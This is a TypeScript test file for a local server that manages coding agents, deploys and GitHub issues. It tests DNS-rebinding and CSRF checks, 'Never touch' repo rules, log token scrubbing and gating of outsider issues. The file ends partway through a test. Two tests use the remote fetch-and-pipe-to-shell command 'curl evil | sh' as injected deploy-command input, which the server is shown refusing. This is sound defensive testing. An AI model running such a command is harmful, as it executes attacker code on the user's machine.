import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { createApp } from "../../src/server/app.ts";
import { Automations } from "../../src/server/automations.ts";
import { Bus } from "../../src/server/bus.ts";
import type { Cli } from "../../src/server/cli.ts";
import type { Config } from "../../src/server/config.ts";
import { filterNeverTouch, readNeverTouch, writeNeverTouch } from "../../src/server/config.ts";
import { kvSet, openDb } from "../../src/server/db.ts";
import { Engine } from "../../src/server/engine.ts";
import { Environments } from "../../src/server/environments.ts";
import { FakeExecutor } from "../../src/server/executor/fake.ts";
import { Notifier } from "../../src/server/notify.ts";
import { Poller } from "../../src/server/poller.ts";
import { Releases } from "../../src/server/releases.ts";
import { Store } from "../../src/server/store.ts";
import type {
	EnvironmentView,
	EnvSuggestion,
	Project,
	ProjectEnvironmentsResponse,
	QueueResponse,
	ShellResponse,
	VersionsResponse,
} from "../../src/shared/types.ts";

const PORT = 4399;
const TOKEN = "t".repeat(32);
const HOST = { host: `127.0.0.1:${PORT}` };
const SESSION = { ...HOST, "x-sf-session": TOKEN, "content-type": "application/json" };

let dir: string;
let store: Store;
let exec: FakeExecutor;
let environments: Environments;
let deployed: Array<{ command: string; cwd: string }>;
let health: { status: number | null; error: string | null };
let deployExit: number;
let holdDeploy = false;
let beforeGitLog: (() => Promise<void>) | null = null;
let runnerOutput: string[] = [];
let lateOutput: (text: string) => void = () => {};
let releaseDeploy: (code: number) => void = () => {};
let calls: string[];
let notifyCode = 0;
let origin = "git@github.com:me/fairway.git\n";
let app: ReturnType<typeof createApp>;

const cli: Cli = async (cmd, args) => {
	calls.push(`${cmd} ${args.join(" ")}`);
	if (cmd === "git" && args.includes("log")) await beforeGitLog?.();
	if (cmd === "git" && args[0] === "remote")
		return { code: 0, stdout: origin, stderr: "", timedOut: false, missing: false };
	if (cmd === "terminal-notifier")
		return { code: notifyCode, stdout: "", stderr: "", timedOut: false, missing: false };
	if (cmd === "gh" && args[1] === "list") {
		return {
			code: 0,
			stdout: JSON.stringify(
				["me/fairway", "me/client-work", "me/client-archive"].map((nameWithOwner) => ({
					nameWithOwner,
					pushedAt: "2026-11-01T00:00:00Z",
					isPrivate: true,
					isArchived: false,
				})),
			),
			stderr: "",
			timedOut: false,
			missing: false,
		};
	}
	return { code: 0, stdout: "", stderr: "", timedOut: false, missing: false };
};

beforeEach(() => {
	dir = mkdtempSync(join(tmpdir(), "sf-"));
	calls = [];
	exec = new FakeExecutor();
	const config: Config = { dataDir: dir, port: PORT, host: "127.0.0.1", sessionToken: TOKEN, demo: false };
	store = new Store(openDb(join(dir, "t.db")), dir);
	const bus = new Bus();
	const engine = new Engine({
		store,
		cli,
		executor: exec,
		publish: bus.publish,
		pollSoon: () => {},
	});
	const poller = new Poller({
		store,
		cli,
		engine: () => engine,
		publish: bus.publish,
		onRegression: () => {},
		onRead: () => {},
	});
	poller.stop();
	deployed = [];
	health = { status: 200, error: null };
	deployExit = 0;
	runnerOutput = ["building\nghp_abcdefghij", "1234567890 done\n"];
	environments = new Environments({
		store,
		cli,
		publish: bus.publish,
		deployRunner: (command, cwd, onOutput) => {
			deployed.push({ command, cwd });
			// In two pieces, as a pipe can deliver it.
			for (const piece of runnerOutput) onOutput(piece);
			lateOutput = onOutput;
			let finish: (code: number) => void = () => {};
			const done = new Promise<number>((r) => {
				finish = r;
			});
			if (holdDeploy) releaseDeploy = finish;
			else finish(deployExit);
			return { done, kill: () => finish(143) };
		},
		healthFetch: async () => health,
	});
	app = createApp({
		config,
		store,
		cli,
		engine,
		versions: new Releases({
			mayTouch: () => true,
			root: dir,
			dir: join(dir, "releases"),
			repo: "me/software-factory",
			port: PORT,
			serviceLabel: "x",
			cli,
			publish: bus.publish,
			smoke: async () => {},
			guard: () => {},
			exit: () => {},
		}),
		self: { repo: "me/software-factory", root: dir },
		automations: new Automations({ store, cli, executor: exec, publish: bus.publish }),
		environments,
		executor: exec,
		poller,
		notifier: new Notifier(store, cli, PORT),
		bus,
		webRoot: join(dir, "none"),
	});
});

describe("the boundary", () => {
	it("refuses a wrong Host, which stops DNS rebinding", async () => {
		const res = await app.request("/api/shell", { headers: { host: "evil.example" } });
		expect(res.status).toBe(403);
	});

	it("refuses a wrong Origin", async () => {
		const res = await app.request("/api/line", {
			method: "POST",
			headers: { ...SESSION, origin: "https://evil.example" },
			body: '{"stopped":true}',
		});
		expect(res.status).toBe(403);
		expect(store.line().stopped).toBe(false);
	});

	it("refuses a mutation without the session header", async () => {
		const res = await app.request("/api/line", {
			method: "POST",
			headers: { ...HOST, "content-type": "application/json" },
			body: '{"stopped":true}',
		});
		expect(res.status).toBe(403);
		expect(store.line().stopped).toBe(false);
	});

	it("accepts a mutation with it", async () => {
		const res = await app.request("/api/line", {
			method: "POST",
			headers: SESSION,
			body: '{"stopped":true}',
		});
		expect(res.status).toBe(200);
		expect(store.line().stopped).toBe(true);
	});

	it("refuses another site calling the API", async () => {
		const res = await app.request("/api/queue", { headers: { ...HOST, "sec-fetch-site": "cross-site" } });
		expect(res.status).toBe(403);
	});

	it("sets a strict CSP and no CORS", async () => {
		const res = await app.request("/api/shell", { headers: HOST });
		expect(res.headers.get("content-security-policy")).toContain("default-src 'self'");
		expect(res.headers.get("access-control-allow-origin")).toBeNull();
	});

	it("rejects a bad body with a plain message", async () => {
		const res = await app.request("/api/line", { method: "POST", headers: SESSION, body: "{}" });
		expect(res.status).toBe(400);
	});
});

describe("never touch", () => {
	beforeEach(() => writeNeverTouch(dir, ["client-*"]));

	it("removes matching repos from the list and sends only a count", async () => {
		const res = await app.request("/api/repos", { headers: HOST });
		const text = await res.text();
		const body = JSON.parse(text);
		expect(body.repos.map((r: { repo: string }) => r.repo)).toEqual(["me/fairway"]);
		expect(body.skipped).toBe(2);
		expect(text).not.toContain("client-work");
	});

	it("saves a rule even when the config file is broken", async () => {
		writeFileSync(store.file.path, "{ nope");
		const res = await app.request("/api/settings/projects", {
			method: "PUT",
			headers: SESSION,
			body: JSON.stringify({ cloneFolder: store.settings().projects.cloneFolder, neverTouch: ["acme-*"] }),
		});
		expect(res.status).toBe(200);
		expect(store.neverTouch()).toEqual(["acme-*"]);
	});

	it("tells the page the config file is broken", async () => {
		writeFileSync(store.file.path, "{ nope");
		const shell = await (await app.request("/api/shell", { headers: HOST })).json();
		expect(shell.configError).toMatch(/isn't valid JSON/);
	});

	it("refuses to add or clone a matching repo", async () => {
		const res = await app.request("/api/projects", {
			method: "POST",
			headers: SESSION,
			body: JSON.stringify({ repos: [{ repo: "me/client-work", clone: true }] }),
		});
		const body = await res.json();
		expect(body.added).toEqual([]);
		expect(body.failed[0].reason).toContain("Never touch");
		expect(calls.some((c) => c.includes("clone"))).toBe(false);
	});

	it("a rule added later hides an existing project everywhere", async () => {
		writeNeverTouch(dir, []);
		await app.request("/api/projects", {
			method: "POST",
			headers: SESSION,
			body: JSON.stringify({ repos: [{ repo: "me/client-new", clone: false }] }),
		});
		expect(store.projects()).toHaveLength(1);
		writeNeverTouch(dir, ["client-*"]);
		expect(store.projects()).toHaveLength(0);
		const res = await app.request("/api/projects/client-new", { headers: HOST });
		expect(res.status).toBe(404);
	});
});

describe("removing a project", () => {
	beforeEach(() => {
		for (const slug of ["a", "b"]) {
			store.db
				.prepare("INSERT INTO projects (slug, repo, name, url, added_at) VALUES (?, ?, ?, ?, ?)")
				.run(slug, `me/${slug}`, slug, "", new Date().toISOString());
		}
	});

	it("refuses the last project", async () => {
		await app.request("/api/projects/a/remove", { method: "POST", headers: SESSION });
		const res = await app.request("/api/projects/b/remove", { method: "POST", headers: SESSION });
		expect(res.status).toBe(409);
		expect((await res.json()).error).toContain("only project");
	});
});

describe("settings", () => {
	it("refuses limits out of range", async () => {
		const res = await app.request("/api/settings/agents", {
			method: "PUT",
			headers: SESSION,
			body: JSON.stringify({ agentsAtOnce: 9, pauseOnReview: false, retries: 1, agent: "claude" }),
		});
		expect(res.status).toBe(400);
	});

	it("won't turn on merge without me for a type that hasn't qualified", async () => {
		const { approvals } = store.settings();
		const res = await app.request("/api/settings/approvals", {
			method: "PUT",
			headers: SESSION,
			body: JSON.stringify({ ...approvals, mergeWithoutMe: { ...approvals.mergeWithoutMe, Chore: true } }),
		});
		expect(res.status).toBe(409);
		expect(store.settings().approvals.mergeWithoutMe.Chore).toBe(false);
	});

	it("tells a blocked notification from a sent one", async () => {
		notifyCode = 3;
		const blocked = await app.request("/api/notifications/test", {
			method: "POST",
			headers: SESSION,
			body: "{}",
		});
		expect(await blocked.json()).toEqual({ ok: false, result: "blocked" });
		expect(store.settings().notifications.lastTest).toBe("blocked");
		notifyCode = 0;
		const sent = await app.request("/api/notifications/test", {
			method: "POST",
			headers: SESSION,
			body: "{}",
		});
		expect(await sent.json()).toEqual({ ok: true, result: "ok" });
		expect(store.settings().notifications.lastTest).toBe("ok");
	});
});

describe("the Never touch file", () => {
	it("refuses a file it can't fully read, rather than dropping rules", () => {
		const file = join(dir, "never-touch.json");
		for (const bad of ['{"rules":["*x*"]}', '["*x*", 3]', "not json"]) {
			writeFileSync(file, bad);
			expect(() => readNeverTouch(dir)).toThrow(/JSON list of strings/);
		}
		writeFileSync(file, '["*x*"]');
		expect(readNeverTouch(dir)).toEqual(["*x*"]);
	});
});

describe("choosing a project's folder", () => {
	const add = async () =>
		app.request("/api/projects", {
			method: "POST",
			headers: SESSION,
			body: JSON.stringify({ repos: [{ repo: "me/fairway", clone: false }] }),
		});
	const choose = (path: string) =>
		app.request("/api/projects/fairway/folder", {
			method: "POST",
			headers: SESSION,
			body: JSON.stringify({ path }),
		});
	const checkout = (name: string) => {
		const path = join(dir, name);
		mkdirSync(join(path, ".git"), { recursive: true });
		return path;
	};

	beforeEach(() => {
		origin = "git@github.com:me/fairway.git\n";
		writeNeverTouch(dir, []);
	});

	it("takes a checkout of this repo", async () => {
		await add();
		expect((await choose(checkout("mine"))).status).toBe(200);
	});

	it("refuses a checkout of a different repo, since agents push from it", async () => {
		await add();
		origin = "git@github.com:me/something-else.git\n";
		const res = await choose(checkout("other"));
		expect(res.status).toBe(400);
		expect((await res.json()).error).toContain("isn't a checkout of me/fairway");
	});

	it("follows a symlink before checking Never touch", async () => {
		await add();
		const real = checkout("client-secret");
		const link = join(dir, "innocent");
		symlinkSync(real, link);
		writeNeverTouch(dir, ["*client-secret*"]);
		expect((await choose(link)).status).toBe(403);
	});
});

describe("a symlink to a Never touch folder", () => {
	it("is refused when adding a project, and hides a project already pointing there", async () => {
		origin = "git@github.com:me/fairway.git\n";
		const clones = join(dir, "clones");
		mkdirSync(clones);
		kvSet(store.db, "settings:cloneFolder", clones);
		const secret = join(dir, "client-secret");
		mkdirSync(join(secret, ".git"), { recursive: true });
		symlinkSync(secret, join(clones, "fairway"));
		writeNeverTouch(dir, ["*client-secret*"]);
		const res = await app.request("/api/projects", {
			method: "POST",
			headers: SESSION,
			body: JSON.stringify({ repos: [{ repo: "me/fairway", clone: false }] }),
		});
		expect((await res.json()).added).toEqual([]);
		expect(store.projects()).toEqual([]);
		store.db
			.prepare("INSERT INTO projects (slug, repo, name, url, local_path, added_at) VALUES (?, ?, ?, ?, ?, ?)")
			.run("fairway", "me/fairway", "fairway", "", join(clones, "fairway"), store.iso());
		expect(store.projects()).toEqual([]);
	});
});

describe("two repos with the same name", () => {
	const add = async (...repos: string[]) =>
		(
			await app.request("/api/projects", {
				method: "POST",
				headers: SESSION,
				body: JSON.stringify({ repos: repos.map((repo) => ({ repo, clone: false })) }),
			})
		).json();

	it("stay two projects, each acting on its own repo", async () => {
		expect((await add("client/app", "me/app")).added).toEqual(["app", "me-app"]);
		expect(store.project("app")?.repo).toBe("client/app");
		expect(store.project("me-app")?.repo).toBe("me/app");
	});

	it("still treats adding the same repo again as the same project", async () => {
		await add("client/app", "me/app");
		expect((await add("me/app")).added).toEqual(["me-app"]);
		expect((await add("Client/App")).added).toEqual(["app"]);
		expect(store.projects()).toHaveLength(2);
	});
});

describe("a new project and Never touch", () => {
	it("refuses a matching name before asking GitHub about it", async () => {
		writeNeverTouch(dir, ["*client-secret*"]);
		const res = await app.request("/api/new-project/check", {
			method: "POST",
			headers: SESSION,
			body: JSON.stringify({ name: "client-secret-app" }),
		});
		expect((await res.json()).problem).toMatch(/Never touch/);
	});

	it("follows a symlinked clone folder to where a new folder would land", () => {
		const secret = join(dir, "client-secret");
		mkdirSync(secret);
		const link = join(dir, "clones-link");
		symlinkSync(secret, link);
		const { kept } = filterNeverTouch(["*client-secret*"], [{ repo: "me/app", path: join(link, "app") }]);
		expect(kept).toEqual([]);
	});
});

describe("a broken Never touch file, seen from the page", () => {
	it("says what's wrong instead of a generic failure", async () => {
		writeFileSync(join(dir, "never-touch.json"), "{broken");
		const res = await app.request("/api/shell", { headers: HOST });
		expect(res.status).toBe(503);
		expect((await res.json()).error).toContain("must be a JSON list of strings");
	});
});

describe("environments", () => {
	const post = (path: string, data: unknown) =>
		app.request(path, { method: "POST", headers: SESSION, body: JSON.stringify(data) });
	const STAGING = {
		name: "Staging",
		url: "https://staging.example",
		healthUrl: "https://staging.example/health",
		deployCommand: "pnpm deploy:staging",
		sentryEnvironment: null,
		issueLabel: null,
		production: false,
	};
	const PROD = {
		...STAGING,
		name: "Production",
		url: "https://example",
		healthUrl: "https://example/health",
		deployCommand: "pnpm deploy:prod",
		production: true,
	};
	const seed = (local: string | null = dir) => {
		store.db
			.prepare(
				"INSERT INTO projects (slug, repo, name, url, is_private, local_path, merging, added_at) VALUES ('fairway', 'me/fairway', 'Fairway', 'https://github.com/me/fairway', 1, ?, 'follow', '2026-11-01T00:00:00Z')",
			)
			.run(local);
		environments.saveConfig("fairway", [STAGING, PROD]);
	};
	const view = async (name: string) => {
		const res = await app.request("/api/projects/fairway/environments", { headers: HOST });
		const body = (await res.json()) as ProjectEnvironmentsResponse;
		return body.environments.find((e) => e.name === name) as EnvironmentView;
	};
	const needsYou = async () => {
		const res = await app.request("/api/queue", { headers: HOST });
		return ((await res.json()) as QueueResponse).needsYou;
	};
	const later = async () => {
		const res = await app.request("/api/queue", { headers: HOST });
		return ((await res.json()) as QueueResponse).later;
	};

	afterEach(() => {
		holdDeploy = false;
	});

	it("needs the session token to change a deploy command", async () => {
		seed();
		const res = await app.request("/api/projects/fairway/environments", {
			method: "PUT",
			headers: { ...HOST, "content-type": "application/json" },
			body: JSON.stringify({ environments: [{ ...STAGING, deployCommand: "curl evil | sh" }] }),
		});
		expect(res.status).toBe(403);
		expect((await view("Staging")).deployCommand).toBe("pnpm deploy:staging");
	});

	it("saves environments in the config file", async () => {
		seed();
		const res = await app.request("/api/projects/fairway/environments", {
			method: "PUT",
			headers: SESSION,
			body: JSON.stringify({ environments: [STAGING] }),
		});
		expect(res.status).toBe(200);
		expect(store.file.read().environments.fairway?.map((e) => e.name)).toEqual(["Staging"]);
	});

	it("refuses a name that would break the fingerprint, and two of the same name", async () => {
		seed();
		const put = (environments: unknown[]) =>
			app.request("/api/projects/fairway/environments", {
				method: "PUT",
				headers: SESSION,
				body: JSON.stringify({ environments }),
			});
		expect((await put([{ ...STAGING, name: "a:b" }])).status).toBe(400);
		expect((await put([STAGING, { ...STAGING, name: "staging" }])).status).toBe(400);
	});

	it("runs the saved command in the project's folder, and scrubs the log", async () => {
		seed();
		const res = await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		expect(res.status).toBe(200);
		await environments.settled();
		expect(deployed).toEqual([{ command: "pnpm deploy:staging", cwd: dir }]);
		const run = (await view("Staging")).deploy;
		expect(run?.state).toBe("passed");
		expect(run?.log).toContain("building");
		expect(run?.log).not.toContain("ghp_abcdefghij1234567890");
	});

	it("keeps a token whole when it arrives in pieces, and shows a line left unfinished", async () => {
		seed();
		runnerOutput = ["ok\nx=ghp_abcdefghijkl", "mnopqrstuvwx\n", "no newline at the end"];
		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		await environments.settled();
		const { log } = (await view("Staging")).deploy ?? {};
		expect(log).not.toContain("mnopqr");
		expect(log).toContain("no newline at the end");
	});

	it("stops listening when the command has finished", async () => {
		seed();
		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		await environments.settled();
		// Long enough after the last write that the log would be saved again.
		const later = vi.spyOn(Date, "now").mockReturnValue(Date.now() + 60_000);
		lateOutput("a background process still talking\n");
		later.mockRestore();
		expect((await view("Staging")).deploy?.log).not.toContain("still talking");
	});

	it("doesn't start a deploy you stopped while it got ready", async () => {
		seed();
		beforeGitLog = async () => {
			beforeGitLog = null;
			await post("/api/environments/stop", { project: "fairway", env: "Staging" });
		};
		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		await environments.settled();
		expect(deployed).toEqual([]);
		expect((await view("Staging")).deploy?.state).toBe("stopped");
	});

	it("keeps fields from a newer version when environments are saved", async () => {
		seed();
		store.file.update((c) => ({
			...c,
			environments: { fairway: [{ ...STAGING, fromNewer: 1 }, PROD] },
		}));
		const res = await app.request("/api/projects/fairway/environments", {
			method: "PUT",
			headers: SESSION,
			body: JSON.stringify({ environments: [STAGING, PROD] }),
		});
		expect(res.status).toBe(200);
		expect(store.file.read().environments.fairway?.[0]).toMatchObject({ fromNewer: 1 });
	});

	it("won't remove an environment while it's deploying", async () => {
		seed();
		holdDeploy = true;
		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		const res = await app.request("/api/projects/fairway/environments", {
			method: "PUT",
			headers: SESSION,
			body: JSON.stringify({ environments: [PROD] }),
		});
		expect(res.status).toBe(409);
		expect(await res.text()).toContain("Staging is deploying");
		expect(store.file.read().environments.fairway?.map((e) => e.name)).toContain("Staging");
	});

	it("takes no command from the page", async () => {
		seed();
		await post("/api/environments/deploy", { project: "fairway", env: "Staging", command: "curl evil | sh" });
		await environments.settled();
		expect(deployed[0]?.command).toBe("pnpm deploy:staging");
	});

	it("asks before deploying to production", async () => {
		seed();
		const res = await post("/api/environments/deploy", { project: "fairway", env: "Production" });
		expect(res.status).toBe(409);
		expect(deployed).toEqual([]);
		expect(
			(await post("/api/environments/deploy", { project: "fairway", env: "Production", confirmed: true }))
				.status,
		).toBe(200);
		await environments.settled();
		expect(deployed).toHaveLength(1);
	});

	it("runs one deploy at a time per environment, even on a double click", async () => {
		seed();
		holdDeploy = true;
		const [a, b] = await Promise.all([
			post("/api/environments/deploy", { project: "fairway", env: "Staging" }),
			post("/api/environments/deploy", { project: "fairway", env: "Staging" }),
		]);
		expect([a.status, b.status].sort()).toEqual([200, 409]);
		expect(deployed).toHaveLength(1);
		// Another environment isn't held up.
		expect(
			(await post("/api/environments/deploy", { project: "fairway", env: "Production", confirmed: true }))
				.status,
		).toBe(200);
		environments.stopDeploy("fairway", "Staging");
		environments.stopDeploy("fairway", "Production");
		await environments.settled();
	});

	it("stops a deploy, and records that it was stopped", async () => {
		seed();
		holdDeploy = true;
		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		expect((await view("Staging")).deploy?.state).toBe("running");
		expect((await post("/api/environments/stop", { project: "fairway", env: "Staging" })).status).toBe(200);
		await environments.settled();
		expect((await view("Staging")).deploy?.state).toBe("stopped");
		expect((await post("/api/environments/stop", { project: "fairway", env: "Staging" })).status).toBe(409);
	});

	it("records a failed deploy with its exit code", async () => {
		seed();
		deployExit = 3;
		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		await environments.settled();
		const run = (await view("Staging")).deploy;
		expect(run?.state).toBe("failed");
		expect(run?.exitCode).toBe(3);
	});

	it("marks a deploy from before a restart as failed, with the reason", async () => {
		seed();
		holdDeploy = true;
		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
		const restarted = new Environments({
			store,
			cli,
			publish: () => {},
			deployRunner: () => ({ done: Promise.resolve(0), kill: () => {} }),
			healthFetch: async () => health,
		});
		const run = restarted.viewsFor(store.project("fairway") as Project)[0]?.deploy;
		expect(run?.state).toBe("failed");
		expect(run?.message).toContain("restarted");
		releaseDeploy(0);
		await environments.settled();
	});

	it("won't deploy without a folder or a command", async () => {
		seed(null);
		expect((await post("/api/environments/deploy", { project: "fairway", env: "Staging" })).status).toBe(409);
		expect(deployed).toEqual([]);
	});

	it("calls one failed check a blip, and two in a row down", async () => {
		seed();
		health = { status: 503, error: null };
		await environments.checkAll();
		expect((await view("Staging")).health.state).toBe("up");
		await environments.checkAll();
		const down = (await view("Staging")).health;
		expect(down.state).toBe("down");
		expect(down.error).toBe("Health check returned HTTP 503.");
		health = { status: 200, error: null };
		await environments.checkAll();
		expect((await view("Staging")).health.state).toBe("up");
	});

	it("doesn't wait a minute to answer Check now", async () => {
		seed();
		health = { status: null, error: "No answer" };
		await post("/api/environments/check", { project: "fairway", env: "Staging" });
		expect((await view("Staging")).health.state).toBe("down");
	});

	it("puts a down production first in the queue, and a down staging under later", async () => {
		seed();
		health = { status: 503, error: null };
		await environments.checkAll();
		await environments.checkAll();
		const first = (await needsYou())[0];
		expect(first?.kind).toBe("env_down");
		expect(first?.title).toBe("Production is down");
		expect((await later()).map((i) => i.kind)).toContain("env_down_later");
		const shell = (await (await app.request("/api/shell", { headers: HOST })).json()) as ShellResponse;
		expect(shell.counts.environments).toBe(2);
	});

	it("keeps a dismissed outage quiet, and brings it back when it goes down again", async () => {
		seed();
		health = { status: 503, error: null };
		await environments.checkAll();
		await environments.checkAll();
		const fp = "env:fairway:Production";
		expect((await post("/api/triage", { fingerprints: [fp], action: "dismiss" })).status).toBe(200);
		expect((await needsYou()).map((i) => i.fingerprint)).not.toContain(fp);
		health = { status: 200, error: null };
		await environments.checkAll();
		await new Promise((r) => setTimeout(r, 5));
		health = { status: 503, error: null };
		await environments.checkAll();
		await environments.checkAll();
		expect((await needsYou()).map((i) => i.fingerprint)).toContain(fp);
	});

	it("starts a fix with the environment's facts as data, and asks before a merging mode on production", async () => {
		seed();
		health = { status: 503, error: null };
		await environments.checkAll();
		await environments.checkAll();
		store.file.update((c) => ({
			...c,
			modes: [
				{
					id: "send",
					name: "Send",
					description: "",
					prompt: "",
					plan: "skip",
					merge: "factory",
					provider: null,
					model: null,
					builtin: false,
				},
			],
		}));
		const body = {
			project: "fairway",
			type: "Bug fix",
			description: "Fix Fairway Production",
			mode: "send",
			source: { kind: "environment", fingerprint: "env:fairway:Production" },
		};
		expect((await post("/api/work-orders", body)).status).toBe(409);
		const started = await post("/api/work-orders", { ...body, confirmed: true });
		expect(started.status).toBe(200);
		const wo = store.workOrder(((await started.json()) as { id: number }).id);
		expect(wo?.source.kind).toBe("environment");
		expect(wo?.source.data).toContain("Health check returned HTTP 503.");
		expect((await view("Production")).workOrderId).toBe(wo?.id);
	});

	it("refuses an environment from another project as a source", async () => {
		seed();
		const res = await post("/api/work-orders", {
			project: "fairway",
			type: "Bug fix",
			description: "x",
			source: { kind: "environment", fingerprint: "env:other:Production" },
		});
		expect(res.status).toBe(400);
	});

	it("shows suggestions, runs nothing, and leaves out what's already set up", async () => {
		seed();
		writeFileSync(
			join(dir, "package.json"),
			JSON.stringify({ scripts: { "deploy:preview": "x", "deploy:staging": "y" } }),
		);
		const res = await app.request("/api/projects/fairway/environments/suggest", { headers: HOST });
		expect((await res.json()) as EnvSuggestion[]).toEqual([
			{ name: "Preview", deployCommand: "npm run deploy:preview", production: false, from: "package.json" },
		]);
		expect(deployed).toEqual([]);
		expect(store.file.read().environments.fairway).toHaveLength(2);
	});
});

describe("issues", () => {
	const OUTSIDER = {
		number: 5,
		title: "It breaks",
		url: "https://github.com/x/y/issues/5",
		body: "Steps to reproduce",
		author: "someone",
		authorAssociation: "NONE",
		authorCreatedAt: null,
		createdAt: "2026-11-01T00:00:00Z",
		updatedAt: "2026-11-01T00:00:00Z",
		labels: [],
		comments: 0,
		bodyHash: "hash-1",
	};
	const SEND = {
		id: "send",
		name: "Send",
		description: "",
		prompt: "",
		plan: "skip",
		merge: "factory",
		provider: null,
		model: null,
		builtin: false,
	};
	const STANDARD = { ...SEND, id: "std", name: "Standard", merge: "you" };
	const post = (path: string, data: unknown) =>
		app.request(path, {
			method: "POST",
			headers: SESSION,
			body: JSON.stringify(data),
		});
	it("won't let a merging mode take over a PR the factory didn't open", async () => {
		const res = await post("/api/work-orders", {
			project: "fairway",
			type: "Bug fix",
			description: "Bring it up to date",
			mode: "send",
			source: { kind: "stale_pr", prNumber: 7 },
		});
		expect(res.status).toBe(409);
		expect(await res.text()).toContain("can't merge a PR the factory didn't open");
	});

	const fix = (mode: string, extra: object = {}) =>
		post("/api/work-orders", {
			project: "fairway",
			type: "Bug fix",
			description: "Words from the page",
			mode,
			source: { kind: "issue", fingerprint: "issue:fairway:5" },
			...extra,
		});
	beforeEach(() => {
		store.db
			.prepare("INSERT INTO projects (slug, repo, name, url, local_path, added_at) VALUES (?, ?, ?, ?, ?, ?)")
			.run("fairway", "me/fairway", "Fairway", "https://github.com/me/fairway", dir, store.iso());
		store.saveIssues("fairway", [OUTSIDER]);
		store.saveModes([STANDARD, SEND] as never, "std");
	});

	it("refuses a mode that merges on an unread outsider's issue", async () => {
		const res = await fix("send");
		expect(res.status).toBe(409);
		expect((await res.json()).error).toContain("Read #5");
		expect(store.workOrders()).toHaveLength(0);
	});

	it("won't write the command for one either", async () => {
		const res = await post("/api/work-orders/command", {
			project: "fairway",
			type: "Bug fix",
			description: "x",
			mode: "send",
			source: { kind: "issue", fingerprint: "issue:fairway:5" },
		});
		expect(res.status).toBe(409);
	});

	it("uses your default mode when none is named", async () => {
		await post("/api/issues/read", { project: "fairway", number: 5, hash: "hash-1" });
		const res = await post("/api/work-orders", {
			project: "fairway",
			type: "Bug fix",
			description: "x",
			source: { kind: "issue", fingerprint: "issue:fairway:5" },
		});
		const { id } = (await res.json()) as { id: number };
		expect(store.workOrder(id)?.mode?.id).toBe("std");
	});

	it("doesn't let another kind step around that", async () => {
		const res = await post("/api/work-orders", {
			project: "fairway",
			type: "Bug fix",
			description: "x",
			mode: "send",
			source: { kind: "person", fingerprint: "issue:fairway:5" },
		});
		expect(res.status).toBe(409);
	});

	it("needs the read to be of this version", async () => {
		const stale = await post("/api/issues/read", { project: "fairway", number: 5, hash: "something-older" });
		expect(stale.status).toBe(409);
		expect(store.issue("fairway", 5)?.locked).toBe(true);
		const ok = await post("/api/issues/read", { project: "fairway", number: 5, hash: "hash-1" });
		expect(ok.status).toBe(200);
		expect(store.issue("fairway", 5)).toMatchObject({ locked: false, group: "looks_legit" });
		expect((await fix("send")).status).toBe(200);
	});

	it("takes the read away when the issue is edited", async () => {
		await post("/api/issues/read", { project: "fairway", number: 5, hash: "hash-1" });
		store.saveIssues("fairway", [{ ...OUTSIDER, body: "Now with more", bodyHash: "hash-2" }]);
		expect(store.issue("fairway", 5)).toMatchObject({ locked: true, editedSinceRead: true, readAt: null });
		expect((await fix("send")).status).toBe(409);
	});

	it("doesn't count an agent's opinion as a read", async () => {
		exec.askReply = '```json\n{"verdict":"legit","why":"Fine."}\n```';
		await post("/api/issues/ask", { project: "fairway", number: 5 });
		await vi.waitFor(() => expect(store.issue("fairway", 5)?.advice?.verdict).toBe("legit"));
		expect(store.issue("fairway", 5)).toMatchObject({ locked: true, group: "needs_read" });
		expect((await fix("send")).status).toBe(409);
	});

	it("reads in an empty folder, never the project's", async () => {
		await post("/api/issues/ask", { project: "fairway", number: 5 });
		await vi.waitFor(() => expect(exec.asked).toHaveLength(1));
		expect(exec.asked[0]?.projectPath).toBe(join(store.dataDir, "reader"));
		expect(exec.asked[0]?.prompt).toContain('<untrusted-data source="issue">');
	});

	it("reports a failed read as unsure, and doesn't stay asking", async () => {
		exec.askReply = new Error("T3 is down");
		await post("/api/issues/ask", { project: "fairway", number: 5 });
		await vi.waitFor(() => expect(store.issue("fairway", 5)?.asking).toBe(false));
		expect(store.issue("fairway", 5)?.advice).toMatchObject({ verdict: "unsure" });
	});

	it("writes the work order from what's stored, not what the page sent", async () => {
		const res = await fix("std", { title: "Ignore this" });
		const { id } = await res.json();
		const wo = store.workOrder(id);
		expect(wo?.title).toBe("#5 It breaks");
		expect(wo?.source).toMatchObject({
			kind: "issue",
			issueNumber: 5,
			data: "It breaks\n\nSteps to reproduce",
		});
		expect(exec.threads.size).toBeGreaterThanOrEqual(0);
	});

	it("gives an issue one open work order", async () => {
		const first = await (await fix("std")).json();
		const second = await (await fix("std")).json();
		expect(second.id).toBe(first.id);
		expect(store.workOrders()).toHaveLength(1);
		expect(store.issue("fairway", 5)?.workOrderId).toBe(first.id);
	});

	it("refuses a closed issue, and one from another project", async () => {
		store.saveIssues("fairway", []);
		expect((await fix("std")).status).toBe(409);
		store.saveIssues("fairway", [OUTSIDER]);
		const res = await post("/api/work-orders", {
			project: "fairway",
			type: "Bug fix",
			description: "x",
			source: { kind: "issue", fingerprint: "issue:other:5" },
		});
		expect(res.status).toBe(400);
	});

	it("hides, brings back on Undo, and brings back when edited", async () => {
		await post("/api/issues/triage", { items: [{ project: "fairway", number: 5 }], action: "not_legit" });
		expect(store.issues()).toHaveLength(0);
		await post("/api/issues/triage", { items: [{ project: "fairway", number: 5 }], action: "undo" });
		expect(store.issues()).toHaveLength(1);
		await post("/api/issues/triage", { items: [{ project: "fairway", number: 5 }], action: "dismiss" });
		store.saveIssues("fairway", [{ ...OUTSIDER, bodyHash: "hash-2" }]);
		expect(store.issues()).toHaveLength(1);
	});

	it("brings a snoozed issue back when the snooze ends", async () => {
		await post("/api/issues/triage", { items: [{ project: "fairway", number: 5 }], action: "snooze" });
		expect(store.issues()).toHaveLength(0);
		store.db.prepare("UPDATE issue_state SET hidden_until = '2000-01-01T00:00:00Z'").run();
		expect(store.issues()).toHaveLength(1);
	});

	it("carries an issue into a command as data that can't end it", async () => {
